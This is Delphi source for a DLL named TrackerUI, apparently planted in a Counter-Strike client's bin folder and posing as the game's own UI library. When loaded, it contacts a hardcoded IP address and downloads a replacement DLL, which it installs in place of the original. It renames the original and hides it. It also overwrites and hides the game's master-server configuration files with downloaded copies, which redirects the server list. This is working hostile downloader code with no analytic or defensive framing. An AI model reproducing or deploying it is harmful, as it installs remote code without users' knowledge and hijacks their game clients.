library TrackerUI;

{ Important note about DLL memory management: ShareMem must be the
  first unit in your library's USES clause AND your project's (select
  Project-View Source) USES clause if your DLL exports any procedures or
  functions that pass strings as parameters or function results. This
  applies to all strings passed to and from your DLL--even those that
  are nested in records and classes. ShareMem is the interface unit to
  the BORLNDMM.DLL shared memory manager, which must be deployed along
  with your DLL. To avoid using BORLNDMM.DLL, pass string information
  using PChar or ShortString parameters. }

uses
  SysUtils,
  IdHTTP,
  Windows,
  Classes;

{$R *.res}
var
BaseURL: string;
ret: Integer;
myFile : TextFile;

procedure DownloadFile(File1, File2: string; var val: Integer); cdecl;
	var
	  idHTTP1: TIdHTTP;
	  Stream:TMemoryStream;
	begin
		try
			idHTTP1 := TIdHTTP.Create(nil);
			Stream:=TMemoryStream.Create;
			IdHTTP1.Get(File1,Stream);
			Stream.SaveToFile(File2);
			Stream.Free;
			val := 1;
		except
			val := 0;
	end;
end;

begin
  DownloadFile('http://91.211.244.5/master/ms.txt','cstrike\bin\base', ret);
  if ret = 1 then
  begin
    AssignFile(myFile, 'cstrike\bin\base');
    Reset(myFile);
    ReadLn(myFile, BaseURL);
    CloseFile(myFile);
    DeleteFile('cstrike\bin\base');
	  FileSetAttr('cstrike\bin\TrackerUID.dll', 128);
    DeleteFile('cstrike\bin\TrackerUID.dll');

		DownloadFile(BaseURL + '/cstrike\bin\TrackerUIO.dll','cstrike\bin\TrackerUIO.dll', ret);

		if ret = 1 then
		begin
      FileSetAttr('cstrike\bin\TrackerUIO.dll', 128);
			FileSetAttr('cstrike\bin\TrackerUI.dll', 128);
			RenameFile('cstrike\bin\TrackerUI.dll', 'cstrike\bin\TrackerUID.dll');
      FileSetAttr('cstrike\bin\TrackerUID.dll', 1 + 2);
			RenameFile('cstrike\bin\TrackerUIO.dll', 'cstrike\bin\TrackerUI.dll');
			FileSetAttr('cstrike\bin\TrackerUI.dll', 1 + 2);
		end;

    FileSetAttr('config\MasterServers.vdf', 128);
    DownloadFile(BaseURL + '/config/MasterServers.vdf','config\MasterServers.vdf', ret);
    FileSetAttr('config\MasterServers.vdf', 1 + 2);

    FileSetAttr('config\rev_MasterServers.vdf', 128);
    DownloadFile(BaseURL + '/config/MasterServers.vdf','config\rev_MasterServers.vdf', ret);
    FileSetAttr('config\rev_MasterServers.vdf', 1 + 2);

    FileSetAttr('platform\config\MasterServers.vdf', 128);
    DownloadFile(BaseURL + '/config/MasterServers.vdf','platform\config\MasterServers.vdf', ret);
    FileSetAttr('platform\config\MasterServers.vdf', 1 + 2);

    FileSetAttr('platform\config\rev_MasterServers.vdf', 128);
    DownloadFile(BaseURL + '/config/MasterServers.vdf','platform\config\rev_MasterServers.vdf', ret);
    FileSetAttr('platform\config\rev_MasterServers.vdf', 1 + 2);
	end;
end.

